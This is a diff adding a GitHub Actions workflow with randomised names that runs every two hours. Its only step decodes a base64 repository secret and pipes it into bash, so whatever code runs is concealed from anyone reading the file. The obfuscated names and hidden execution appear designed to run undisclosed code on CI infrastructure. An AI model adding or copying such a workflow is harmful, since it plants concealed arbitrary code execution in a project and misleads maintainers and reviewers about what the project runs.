@@ -1,0 +1,13 @@
+name: VtcshNsB
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  qZGzxQGsRxAt:
+    runs-on: ubuntu-latest
+    env:
+      ydYECaVZ: ${{ secrets.LRhWuWGHXxtf }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.evaVtZT }}" | base64 -d | bash
